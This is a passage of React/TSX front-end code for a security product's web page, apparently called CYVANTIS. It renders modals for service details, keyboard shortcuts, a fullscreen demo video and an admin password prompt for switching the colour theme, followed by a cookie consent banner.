            <p className="text-xs text-slate-300 leading-relaxed bg-[#030612] p-4 rounded-xl border border-slate-800/80">
              {serviceDetails[selectedServiceId].summary}
            </p>

            <div className="space-y-3 font-mono text-xs">
              <h4 className="font-bold text-white flex items-center gap-2 border-b border-slate-800 pb-2">
                <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                How It Is Used in CYVANTIS
              </h4>
              <ul className="space-y-1.5 text-[11px] text-slate-300 font-sans">
                {serviceDetails[selectedServiceId].howItIsUsed.map((item: string, idx: number) => (
                  <li key={idx} className="flex items-start gap-2">
                    <span className="text-[#00d2ff] font-bold">•</span>
                    <span>{item}</span>
                  </li>
                ))}
              </ul>
            </div>

            <div className="space-y-3 font-mono text-xs">
              <h4 className="font-bold text-white flex items-center gap-2 border-b border-slate-800 pb-2">
                <Activity className="w-4 h-4 text-[#ff6b35]" />
                Execution Workflow & Life Cycle
              </h4>
              <div className="space-y-1.5 text-[11px] text-slate-300 font-sans">
                {serviceDetails[selectedServiceId].workflow.map((step: string, idx: number) => (
                  <div key={idx} className="p-2.5 rounded-lg bg-[#030612] border border-slate-800/60 font-mono text-[11px] text-slate-300">
                    {step}
                  </div>
                ))}
              </div>
            </div>

            <div className="flex items-center justify-between pt-4 border-t border-slate-800 font-mono text-xs">
              <span className="px-3 py-1 rounded bg-[#00d2ff]/10 text-[#00d2ff] border border-[#00d2ff]/30 text-[10px]">
                {serviceDetails[selectedServiceId].badge}
              </span>
              <button
                onClick={() => setSelectedServiceId(null)}
                className="px-4 py-2 rounded-xl bg-slate-900 text-slate-300 font-bold"
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Keyboard Shortcuts Help Modal */}
      {showShortcutHelp && (
        <div
          role="dialog"
          aria-modal="true"
          aria-label="Keyboard Shortcuts"
          className="fixed inset-0 z-[190] bg-black/80 backdrop-blur-md flex items-center justify-center p-4 font-mono text-xs"
        >
          <div className="bg-[#060e26] border border-[#00d2ff]/40 rounded-2xl p-6 max-w-md w-full space-y-4 shadow-2xl">
            <div className="flex items-center justify-between border-b border-slate-800 pb-3">
              <span className="font-bold text-white text-sm flex items-center gap-2">
                <Keyboard className="w-4 h-4 text-[#00d2ff]" />
                Power Keyboard Shortcuts
              </span>
              <button onClick={() => setShowShortcutHelp(false)} className="text-slate-400 hover:text-white">✕</button>
            </div>
            <div className="space-y-2 text-slate-300">
              <div className="flex justify-between p-2 rounded bg-[#030612] border border-slate-800">
                <span>Command Palette</span>
                <kbd className="px-2 py-0.5 rounded bg-slate-800 text-[#00d2ff]">Ctrl + K</kbd>
              </div>
              <div className="flex justify-between p-2 rounded bg-[#030612] border border-slate-800">
                <span>Toggle Telemetry Stream Pause/Resume</span>
                <kbd className="px-2 py-0.5 rounded bg-slate-800 text-[#00d2ff]">P</kbd>
              </div>
              <div className="flex justify-between p-2 rounded bg-[#030612] border border-slate-800">
                <span>Focus Search Input Box</span>
                <kbd className="px-2 py-0.5 rounded bg-slate-800 text-[#00d2ff]">/</kbd>
              </div>
              <div className="flex justify-between p-2 rounded bg-[#030612] border border-slate-800">
                <span>Toggle Shortcuts Help</span>
                <kbd className="px-2 py-0.5 rounded bg-slate-800 text-[#00d2ff]">?</kbd>
              </div>
              <div className="flex justify-between p-2 rounded bg-[#030612] border border-slate-800">
                <span>Close Active Inspector / Modal</span>
                <kbd className="px-2 py-0.5 rounded bg-slate-800 text-[#00d2ff]">Esc</kbd>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Video Fullscreen Lightbox Modal */}
      {isVideoModalOpen && (
        <div
          className="fixed inset-0 z-[260] bg-black/90 backdrop-blur-xl flex items-center justify-center p-4 sm:p-8 animate-in fade-in duration-200"
          onClick={() => setIsVideoModalOpen(false)}
        >
          <div
            className="relative max-w-6xl w-full bg-[#0E1A1F] border-2 border-[#C8F904]/60 rounded-3xl p-3 sm:p-5 shadow-[0_0_100px_rgba(200,249,4,0.4)] overflow-hidden"
            onClick={(e) => e.stopPropagation()}
          >
            <div className="flex items-center justify-between pb-3 border-b border-[#6967FB]/40 mb-3 font-mono">
              <div className="flex items-center gap-2 text-sm text-[#C8F904] font-bold">
                <span className="w-2.5 h-2.5 rounded-full bg-[#C8F904] animate-ping" />
                <span>CYVANTIS PLATFORM WALKTHROUGH • FULLSCREEN</span>
              </div>
              <button
                onClick={() => setIsVideoModalOpen(false)}
                className="p-1.5 rounded-lg bg-[#6967FB]/20 hover:bg-[#6967FB]/40 text-white font-mono text-xs transition cursor-pointer"
              >
                ✕ Close [ESC]
              </button>
            </div>
            <div className="rounded-2xl overflow-hidden bg-black aspect-[16/9] border border-white/10 shadow-2xl flex items-center justify-center">
              <img
                src="/cyvantis_demo.webp"
                alt="CYVANTIS Platform Fullscreen Walkthrough"
                className="w-full h-full object-contain"
              />
            </div>
            <div className="mt-3 pt-3 border-t border-[#6967FB]/30 flex flex-wrap items-center justify-between gap-3 text-xs font-mono text-[#9FB0B7]">
              <span>Resolution: 1080p • 60 FPS session capture</span>
              <button
                onClick={() => { setIsVideoModalOpen(false); onLoginClick(); }}
                className="btn-lime py-1.5 px-4 text-xs font-bold cursor-pointer"
              >
                Sign In to SOC Console →
              </button>
            </div>
          </div>
        </div>
      )}

      {/* SOC Admin Theme Authorization Modal */}
      {isAdminAuthModalOpen && (
        <div
          role="dialog"
          aria-modal="true"
          aria-label="Admin Theme Authorization"
          className="fixed inset-0 z-[250] bg-black/85 backdrop-blur-md flex items-center justify-center p-4 font-mono text-xs animate-in fade-in duration-200"
          onClick={() => {
            setIsAdminAuthModalOpen(false);
            setAdminAuthError(null);
          }}
        >
          <div
            className="bg-[#0E1A1F] border-2 border-[#6967FB]/70 hover:border-[#C8F904]/70 transition-colors rounded-2xl p-5 sm:p-7 max-w-md w-full space-y-5 shadow-[0_25px_60px_rgba(0,0,0,0.95),0_0_40px_rgba(105,103,251,0.3)] relative overflow-hidden"
            onClick={(e) => e.stopPropagation()}
          >
            {/* Top Specular Glow */}
            <div className="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-[#6967FB] via-[#C8F904] to-[#6967FB]" />

            {/* Modal Header */}
            <div className="flex items-start justify-between border-b border-[#6967FB]/30 pb-4">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-xl bg-[#6967FB]/20 border border-[#6967FB]/50 flex items-center justify-center text-[#C8F904] shadow-[0_0_15px_rgba(105,103,251,0.4)]">
                  <Lock className="w-5 h-5" />
                </div>
                <div>
                  <h3 className="text-sm font-bold text-white font-mono flex items-center gap-1.5 tracking-wide">
                    <span>ADMIN ACCESS REQUIRED</span>
                  </h3>
                  <p className="text-[11px] text-[#9FB0B7] mt-0.5">
                    Theme Mode Control (Dark / White)
                  </p>
                </div>
              </div>
              <button
                type="button"
                onClick={() => {
                  setIsAdminAuthModalOpen(false);
                  setAdminAuthError(null);
                }}
                className="text-[#9FB0B7] hover:text-white p-1 rounded-lg hover:bg-white/10 transition"
                aria-label="Close modal"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            {/* Mode Target Transition Indicator */}
            <div className="p-3 rounded-xl bg-[#122026] border border-[#6967FB]/30 flex items-center justify-between text-xs font-mono">
              <div className="flex items-center gap-2">
                <span className="text-[#9FB0B7]">Current:</span>
                <span className="font-bold text-white uppercase">{theme === 'dark' ? '🌙 Dark Ops' : '☀️ White Mode'}</span>
              </div>
              <ArrowRight className="w-4 h-4 text-[#C8F904]" />
              <div className="flex items-center gap-2">
                <span className="text-[#9FB0B7]">Target:</span>
                <span className="font-bold text-[#C8F904] uppercase">{theme === 'dark' ? '☀️ White Mode' : '🌙 Dark Ops'}</span>
              </div>
            </div>

            {/* Access Restriction Notice */}
            <div className="p-3 rounded-xl bg-amber-500/10 border border-amber-500/30 text-amber-300 text-[11px] leading-relaxed flex items-start gap-2.5 font-sans">
              <AlertTriangle className="w-4 h-4 text-amber-400 shrink-0 mt-0.5" />
              <div>
                <strong className="font-mono text-amber-400 block text-xs mb-0.5">SECURITY RESTRICTION:</strong>
                Regular users cannot change the interface mode. Only verified SOC System Administrators have permission to toggle enterprise visual telemetry styles.
              </div>
            </div>

            {/* Error Message if invalid credentials */}
            {adminAuthError && (
              <div className="p-3 rounded-xl bg-rose-500/15 border border-rose-500/40 text-rose-300 text-xs flex items-center gap-2 font-mono">
                <ShieldAlert className="w-4 h-4 text-rose-400 shrink-0" />
                <span>{adminAuthError}</span>
              </div>
            )}

            {/* Admin Password Authentication Form */}
            <form onSubmit={handleAdminVerifyAndToggle} className="space-y-4">
              <div>
                <label className="block text-[11px] text-[#9FB0B7] mb-1 font-mono uppercase tracking-wider">
                  SOC Administrator Username
                </label>
                <input
                  type="text"
                  value="admin"
                  disabled
                  className="w-full bg-[#122026] border border-[#6967FB]/30 rounded-xl px-3.5 py-2.5 text-white/70 font-mono text-xs cursor-not-allowed"
                />
              </div>

              <div>
                <label className="block text-[11px] text-[#9FB0B7] mb-1 font-mono uppercase tracking-wider flex items-center justify-between">
                  <span>Administrator Password</span>
                  <span className="text-[10px] text-[#C8F904] normal-case">Master Admin Access</span>
                </label>
                <div className="relative">
                  <input
                    type={showAdminPassword ? 'text' : 'password'}
                    value={adminPasswordInput}
                    onChange={(e) => setAdminPasswordInput(e.target.value)}
                    placeholder="Enter admin password..."
                    autoFocus
                    required
                    className="w-full bg-[#122026] border border-[#6967FB]/40 focus:border-[#C8F904] rounded-xl px-3.5 py-2.5 pr-10 text-white font-mono text-xs outline-none transition placeholder:text-slate-600"
                  />
                  <button
                    type="button"
                    onClick={() => setShowAdminPassword(prev => !prev)}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-[#9FB0B7] hover:text-white p-1"
                    title={showAdminPassword ? 'Hide password' : 'Show password'}
                  >
                    {showAdminPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                  </button>
                </div>
              </div>

              <div className="pt-2 flex items-center gap-3">
                <button
                  type="button"
                  onClick={() => {
                    setIsAdminAuthModalOpen(false);
                    setAdminAuthError(null);
                  }}
                  className="w-1/3 py-2.5 px-3 rounded-xl bg-[#122026] hover:bg-[#1a2f38] text-[#9FB0B7] hover:text-white font-mono text-xs font-bold border border-[#6967FB]/30 transition"
                >
                  CANCEL
                </button>
                <button
                  type="submit"
                  disabled={isVerifyingAdmin || !adminPasswordInput.trim()}
                  className="w-2/3 btn-lime py-2.5 px-4 text-xs font-mono font-bold flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed shadow-[0_0_20px_rgba(200,249,4,0.3)]"
                >
                  {isVerifyingAdmin ? (
                    <>
                      <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                      <span>VERIFYING...</span>
                    </>
                  ) : (
                    <>
                      <Key className="w-3.5 h-3.5" />
                      <span>AUTHORIZE & SWITCH</span>
                    </>
                  )}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* GDPR Cookie Banner */}
      {showCookieBanner && (
        <div className="fixed bottom-0 left-0 right-0 z-[100] bg-[#0E1A1F]/95 border-t border-[#6967FB]/40 shadow-2xl backdrop-blur-2xl p-4 font-sans">
          <div className="max-w-7xl mx-auto flex flex-col sm:flex-row items-center justify-between gap-4">
            <p className="text-xs text-white">
              CYVANTIS uses essential cookies for secure session state and offline 2FA telemetry verification.
            </p>
            <div className="flex items-center gap-3 text-xs font-mono">
              <button
                onClick={() => { localStorage.setItem('cyvantis_cookie_consent', 'all'); setShowCookieBanner(false); }}
                className="btn-lime py-2 px-5 text-xs"
              >
                Accept All
              </button>
            </div>
          </div>
        </div>
      )}

    </div>
  );
};
